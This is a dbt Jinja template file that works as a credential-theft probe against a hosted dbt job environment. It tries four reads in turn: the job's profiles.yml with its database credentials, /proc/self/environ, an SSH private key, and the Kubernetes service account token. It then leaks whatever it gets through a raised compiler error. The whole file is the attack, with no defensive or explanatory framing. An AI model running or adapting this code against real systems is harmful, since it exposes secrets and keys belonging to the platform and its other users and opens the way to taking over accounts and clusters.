{# Try load_file_contents with path traversal for /proc/self/environ #}
{% set ns = namespace(output='[LOAD_FILE_TEST] ') %}

{# Try various file read functions available in dbt #}
{% set run_id = env_var('DBT_CLOUD_RUN_ID', 'unknown') %}

{# Approach 1: load_file_contents() — reads from project dir #}
{% set profiles_content = '' %}
{% set profiles_path = '/tmp/jobs/' ~ run_id ~ '/.dbt/profiles.yml' %}
{% try %}
  {% set profiles_content = load_file_contents(profiles_path) %}
  {% set ns.output = ns.output ~ 'PROFILES_READ=YES | CONTENT=' ~ profiles_content[:800] %}
{% except %}
  {% set ns.output = ns.output ~ 'PROFILES_READ=NO' %}
{% endtry %}

{# Approach 2: Try /proc/self/environ #}
{% try %}
  {% set environ = load_file_contents('/proc/self/environ') %}
  {% set ns.output = ns.output ~ ' | ENVIRON_READ=YES | DATA=' ~ environ[:500] %}
{% except %}
  {% set ns.output = ns.output ~ ' | ENVIRON_READ=NO' %}
{% endtry %}

{# Approach 3: Try SSH key #}
{% set ssh_path = '/tmp/jobs/' ~ run_id ~ '/.ssh/id_rsa' %}
{% try %}
  {% set ssh_key = load_file_contents(ssh_path) %}
  {% set ns.output = ns.output ~ ' | SSH_KEY_READ=YES | KEY=' ~ ssh_key[:200] %}
{% except %}
  {% set ns.output = ns.output ~ ' | SSH_KEY_READ=NO' %}
{% endtry %}

{# Approach 4: Try K8s service account token #}
{% try %}
  {% set k8s_token = load_file_contents('/var/run/secrets/kubernetes.io/serviceaccount/token') %}
  {% set ns.output = ns.output ~ ' | K8S_TOKEN=YES | TOKEN=' ~ k8s_token[:200] %}
{% except %}
  {% set ns.output = ns.output ~ ' | K8S_TOKEN=NO' %}
{% endtry %}

{{ exceptions.raise_compiler_error(ns.output) }}
